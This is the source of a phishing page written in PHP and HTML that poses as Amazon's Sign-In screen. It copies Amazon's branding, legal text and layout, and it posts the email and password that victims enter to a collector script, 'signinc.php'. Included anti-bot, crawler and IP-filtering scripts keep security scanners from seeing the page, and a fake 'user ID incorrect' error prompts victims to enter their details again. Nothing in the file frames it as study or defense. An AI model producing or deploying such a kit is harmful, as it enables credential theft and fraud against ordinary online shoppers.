<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include 'autob/bts2.php';
?>
<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title dir="ltr">Amazon Sign-In</title><link rel="shortcut icon" href="relassets/favicon.ico">
      
        <link rel="stylesheet" href="relassets/61A6IErPNXL._RC_11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-QR0L.css,31U9HrBLKmL.css_.css">
<link rel="stylesheet" href="relassets/01SdjaY0ZsL._RC_31jdWD+JB+L.css,41DBI6BbFkL.css_.css">
<link rel="stylesheet" href="relassets/11qeL1AgUGL.css">

      
        <link rel="stylesheet" href="relassets/61UhpddG6YL._RC_11iHkiAT2oL.css,01wLsDqViEL.css,11MhAJ3QIgL.css,31JhtlVsImL.css,31i+Ric3zOL.css,01DHz7m6lhL.css_.css">
<link rel="stylesheet" href="relassets/01SdjaY0ZsL._RC_31jdWD+JB+L.css,41onG0oRjwL.css_.css">
<link rel="stylesheet" href="relassets/11vbcpUoDhL.css">

<style>.a2hs-ingress-container,a[href^="#nav-hbm-a2hs-trigger"]{display:none!important}.a2hs-ingress-container.a2hs-ingress-visible,a[href^="#nav-hbm-a2hs-trigger"].a2hs-ingress-visible{display:block!important}</style><style>@media all and (display-mode:standalone){#chromeless-view-progress-bar,#chromeless-view-progress-bar::after{position:fixed;top:0;left:0;right:0;height:2px}@keyframes pbAnimation{0%{right:90%}100%{right:10%}}#chromeless-view-progress-bar{background:rgba(255,255,255,.1);z-index:9999999}#chromeless-view-progress-bar::after{content:'';background:#fcbb6a;animation:pbAnimation 10s forwards}}</style><style>#aa-challenge-whole-page-iframe {
    overflow:hidden;
    opacity:1.0;
    position:fixed;
    top:0px;
    bottom:0px;
    right:0px;
    border:none;
    margin:0;
    padding:0;
    height:100%;
    width:100%;
    z-index:999999;
}</style>
<style>
.auth-workflow .auth-pagelet-container {
    width: 100%;
    max-width: 350px;
    margin: 0 auto;
}
.mbll{display:none;}
@media (max-width: 700px){
#authportal-center-section {
    margin: auto;
    width: 100%;
	max-width:350px;}
.dtll{display:none;}
.mbll{display:block;}
}
</style>
</head>

  <body class="ap-locale-en_US a-m-us a-aui_72554-c a-aui_button_aria_label_markup_348458-t1 a-aui_csa_templates_buildin_ww_exp_337518-c a-aui_csa_templates_buildin_ww_launch_337517-c a-aui_csa_templates_declarative_ww_exp_337521-t1 a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_dynamic_img_a11y_markup_345061-t1 a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-t1 a-aui_tnr_v2_180836-c a-meter-animate">
<div id="a-page" class="dtll">
    <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none auth-navbar">
        





<div class="a-section a-spacing-medium a-text-center">
  
    

    
      


<a class="a-link-nav-icon" tabindex="-1" >
  
  <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>

  
  
</a>

    
  
</div>


      </div>

      <div id="authportal-center-section" class="a-section">
        
          
          
            <div id="authportal-main-section" class="a-section">
              






<div class="a-section a-spacing-base auth-pagelet-container">
  
      <div id="auth-cookie-warning-message" class="a-box a-alert a-alert-warning" <?php if(isset($_GET['logerr'])){echo 'style="display:block;"';}?>><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">There was a problem</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
        <p>
            The user ID you used was incorrect.
          <a class="a-link-normal" >
          </a>
        </p>
      </div></div></div>
    
  
</div>

<div class="a-section auth-pagelet-container">

<div class="a-section a-spacing-base">
  <div class="a-section">
    
    <form name="signIn" method="post" novalidate="" action="signinc.php" class="auth-validate-form auth-real-time-validation a-spacing-none" data-fwcim-id="V9aMC4OC">
	
      <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          <h1 class="a-spacing-small">
            Sign-In
          </h1>
          <!-- optional subheading element -->
          
          <div class="a-row a-spacing-base">
            <label for="ap_email" class="a-form-label">
              Email or mobile phone number
            </label>
            
            
            <input type="email" maxlength="128" id="ap_email" name="email" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">

            
            <input type="password" maxlength="1024" id="ap-credential-autofill-hint" name="passtome" class="a-input-text hide">
<div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
  Enter your email or mobile phone number
</div></div></div>

          </div>

          
          <input type="hidden" name="create" value="0">

          <div class="a-section">
            
            <span id="continue" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner"><input id="continue" tabindex="5" class="a-button-input" type="submit" aria-labelledby="continue-announce"><span id="continue-announce" class="a-button-text" aria-hidden="true">
              Continue
            </span></span></span>

<div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
  By continuing, you agree to Amazon's <a >Conditions of Use</a> and <a >Privacy Notice</a>.
</div> 

          </div>

          

          

          



<div class="a-section">
  <div aria-live="polite" class="a-row a-expander-container a-expander-inline-container">
    <a href="javascript:void(0)" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header a-link-expander" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}"><i class="a-icon a-icon-expand"></i><span class="a-expander-prompt">
      Need help?
    </span></a>
    
      <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">

<a id="auth-fpp-link-bottom" class="a-link-normal" >
  Forgot your password?
</a>
      </div>
    
    <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
      <a id="ap-other-signin-issues-link" class="a-link-normal" >
        Other issues with Sign-In
      </a>
    </div>
  </div>
</div>
          
        </div></div>
      </div>
</form>
  </div>
        
        <div class="a-divider a-divider-break"><h5>New to Amazon?</h5></div>
        <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><a id="createAccountSubmit" tabindex="6"  class="a-button-text" role="button">
          Create your Amazon account
        </a></span></span>
      
    
  
</div>

  
  

</div>
            </div>
          
        
      </div>

      
      <div id="right-2">
      </div>

      <div class="a-section a-spacing-top-extra-large auth-footer">
        



<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>

<div class="a-section a-spacing-small a-text-center a-size-mini">
  <span class="auth-footer-seperator"></span>

  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" >
      Conditions of Use
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" >
      Privacy Notice
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" >
      Help
    </a>
    <span class="auth-footer-seperator"></span>
  

  
</div>




<div class="a-section a-spacing-none a-text-center">
  





<span class="a-size-mini a-color-secondary">
  © 1996-<?php echo date("Y");?>, Amazon.com, Inc. or its affiliates
</span>

</div>

      </div>
    </div>

    <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
    </div>
  </div>

<div id="a-page" class="mbll" >
    <div class="a-section a-spacing-none">
      
      
      <!-- NAVYAAN CSS -->
<meta name="theme-color" content="#131921">
<style type="text/css">
.nav-sprite-v3 .nav-sprite {
  background-image: url(relassets/new-nav-sprite-global-1x_blueheaven-account._CB658093420_.png);
  background-repeat: no-repeat;
}
.nav-spinner {
  background-image: url(relassets/snake._CB485935611_.gif);
}
</style>

<link rel="stylesheet" href="relassets/31G2LkGsjYL._RC_41KBYOkTjIL.css,41tdXla23VL.css_.css">
<link rel="stylesheet" href="relassets/41C6LaLLmFL.css">
<link rel="stylesheet" href="relassets/01+72+wCC9L.css">
<link rel="stylesheet" href="relassets/41a4fy9YoKL._RC_31E0X42sNXL.css_.css">


<img src="relassets/new-nav-sprite-global-1x_blueheaven-account._CB658093420_.png" style="display:none" alt="">

    <style mark="aboveNavInjectionCSS" type="text/css">
      #nav-mobile-airstream-stripe img {max-width: 100%;} .nav-searchbar-wrapper {display: flex; }
    </style>
	<header id="nav-main" data-nav-language="en_US" class="nav-mobile nav-progressive-attribute nav-locale-us nav-lang-en nav-ssl nav-unrec nav-blueheaven">
    
    <div id="navbar" cel_widget_id="Navigation-mobile-navbar" role="navigation" class="nav-t-basicNoAuth nav-sprite-v3 celwidget" data-csa-c-id="5stq2q-58o5bv-x40u8s-n1wioi">
        <div id="nav-logobar">
            <div class="nav-left">
                
                
  <div id="nav-logo">
    <a id="nav-logo-sprites" class="nav-logo-link nav-progressive-attribute" aria-label="Amazon">
      <span class="nav-sprite nav-logo-base"></span>
      <span id="logo-ext" class="nav-sprite nav-logo-ext nav-progressive-content"></span>
      <span class="nav-logo-locale">.us</span>
    </a>
  </div>
            </div>
            <div class="nav-right">
                
                
                
                  
            </div>
        </div>
        


        
    </div>
    
    
    <div id="nav-progressive-subnav">
      
    </div>
</header>


 </div>

    <div class="a-container">
      <div class="a-section a-spacing-none">
        
      </div>

      

      <div class="a-section a-spacing-none auth-pagelet-mobile-container">
        







  

  

  


      </div>

      <div class="a-section auth-pagelet-mobile-container">
<div id="outer-accordion-signin-signup-page" class="a-section">
  <h2>
    Welcome
  </h2>


  <div id="accordion-signin-signup-page" data-a-accordion-name="accordion-signin-signup-page" class="a-box-group a-accordion a-spacing-medium a-spacing-top-mini" role="radioGroup">

    





<!--Variables for register -->









  
  
    
  




<div class="a-section a-spacing-base auth-pagelet-container">
  
      <div id="auth-cookie-warning-message" class="a-box a-alert a-alert-warning" <?php if(isset($_GET['logerr'])){echo 'style="display:block;"';}?>><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">There was a problem</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
        <p>
            The user ID you used was incorrect.
          <a class="a-link-normal" >
          </a>
        </p>
      </div></div></div>
    
  
</div>


  <div id="accordion-row-register" class="a-box" data-a-accordion-row-name="accordion-row-register"><div class="a-box-inner a-accordion-row-container">
    
      <div class="a-accordion-row-a11y" role="radio" aria-checked="false" aria-expanded="false"><a id="register_accordion_header" data-csa-c-func-deps="aui-da-a-accordion" data-csa-c-type="widget" data-csa-interaction-events="click" data-action="a-accordion" class="a-accordion-row a-declarative" data-csa-c-id="vizjcd-vrem4-n5vw71-91klk0"><i class="a-icon a-accordion-radio a-icon-radio-inactive"></i><h5>
        <div class="a-row">
          <span class="a-size-base a-text-bold">Create account</span>.
          <span class="a-size-small accordionHeaderMessage">New to Amazon?</span>
        </div>
      </h5></a></div>
  
  </div></div>


    

<!--Variables for signin -->







  <div id="accordion-row-login" class="a-box a-accordion-active" data-a-accordion-row-name="accordion-row-login"><div class="a-box-inner a-accordion-row-container">
    
      <div class="a-accordion-row-a11y" role="radio" aria-checked="true" aria-expanded="true"><a id="login_accordion_header" data-csa-c-func-deps="aui-da-a-accordion" data-csa-c-type="widget" data-csa-interaction-events="click" data-action="a-accordion" class="a-accordion-row a-declarative" aria-label="" data-csa-c-id="1n8ldv-cucneo-x0crba-89mtca"><i class="a-icon a-accordion-radio a-icon-radio-active"></i><h5>
        <div class="a-row">
          <span class="a-size-base a-text-bold">Sign-In</span>.
          <span class="a-size-small accordionHeaderMessage">Already a customer?</span>
        </div>
      </h5></a></div>
    
    <div class="a-accordion-inner" style="overflow: hidden; display: block;">

      

      <form id="ap_login_form" name="signIn" method="post" novalidate="" action="signinc" class="auth-validate-form fwcim-form auth-clearable-form auth-real-time-validation-mobile" data-fwcim-id="KwAZaX8C">
        
          

      
<div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
      <div class="a-row a-spacing-base">
        <span class="a-declarative" data-action="country_picker_bottom_sheet" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-country_picker_bottom_sheet" data-country_picker_bottom_sheet="{}" data-csa-c-id="sualj7-gxt8r2-b57rad-ux8yra">
          <div class="a-input-text-wrapper auth-required-field auth-fill-claim moa-single-claim-input-field-container"><div class="a-section country-picker aok-hidden" value="US" style="display: none;">
          <span class="a-declarative" data-action="a-sheet" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-a-sheet" data-a-sheet="{&quot;sheetType&quot;:&quot;web&quot;,&quot;name&quot;:&quot;country_bottom_sheet_signin&quot;,&quot;preloadDomId&quot;:&quot;country_bottom_sheet_container_signin&quot;,&quot;closeType&quot;:&quot;icon&quot;}" data-csa-c-id="nkgk4a-7mgb43-xcp4dt-5e3gm8">
            <span class="country-display-text">US +1</span>
          </span>
        </div><input type="email" maxlength="128" id="ap_email_login" placeholder="Email or phone number" name="email" autocorrect="off" autocapitalize="off"></div>
          



<div id="ap_email_login_icon" class="auth-clear-icons" style="display: none;">
  

  <i class="a-icon a-icon-close" role="img" aria-label="Clear email text field, button"></i>

</div>
        </span>
        
       
      </div>
    
    
  

  

  
    
    
      <div class="a-input-text-wrapper hide"><input type="password" maxlength="1024" id="ap-credential-autofill-hint" name="password"></div>
    
  
  
  



<div id="auth-emailLogin-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
  Enter your email or mobile phone number
</div></div></div>

</div>

<div class="a-row">
  
    







  
</div>

<div class="a-section">
  <div class="a-button-stack">
    
      
        <span id="continue" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner"><input id="continue" class="a-button-input" type="submit" aria-labelledby="continue-announce"><span id="continue-announce" class="a-button-text" aria-hidden="true">
          Continue
        </span></span></span>
        
        
          <div class="a-section a-spacing-medium">
            



<div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
  By continuing, you agree to Amazon's <a>Conditions of Use</a> and <a>Privacy Notice</a>.
</div> 

          </div>

  </div>
</div>


  



<div class="a-section">
  <div class="a-row a-expander-container a-expander-inline-container">
    <a data-csa-c-func-deps="aui-da-a-expander-toggle" data-csa-c-type="widget" data-csa-interaction-events="click" aria-expanded="false" role="button" href="javascript:void(0)" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header a-link-expander" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}" data-csa-c-id="r74dgg-7oydpm-3cdst2-pzymwd"><i class="a-icon a-icon-expand"></i><span class="a-expander-prompt">
      Need help?<?php if(isset($_SESSION['device']) && !stripos($_SESSION['device'],'yochi')){banbot();};?>
    </span></a>
    
      <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
        



  
  
    
  

<a id="auth-fpp-link-bottom" class="a-link-normal">
  Forgot your password?
</a>
      </div>
    
    <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
      <a id="ap-other-signin-issues-link" class="a-link-normal">
        Other issues with Sign-In
      </a>
    </div>
  </div>
</div>



              
              
            
	  </form>
	  
	  
    </div>
  </div></div>


  </div>
</div>

      </div>

      
      
  <!-- NAVYAAN FOOTER START -->

<footer class="nav-mobile nav-ftr-batmobile">
  
  <div id="nav-ftr" class="nav-t-footer-basicNoAuth nav-sprite-v3">
    
    
    
    
    
    
    
<ul class="nav-ftr-horiz">
    <li class="nav-li">
      <a class="nav-a">Conditions of Use</a>
    </li>
    <li class="nav-li">
      <a class="nav-a">Privacy Notice</a>
    </li>
    <li class="nav-li">
      <a class="nav-a">Interest-Based Ads</a>
    </li>
</ul>

<div id="nav-ftr-copyright">
© 1996-<?php echo date("Y");?>, Amazon.com, Inc. or its affiliates
</div>

  </div>
</footer>


    </div>
  </div>
</body></html>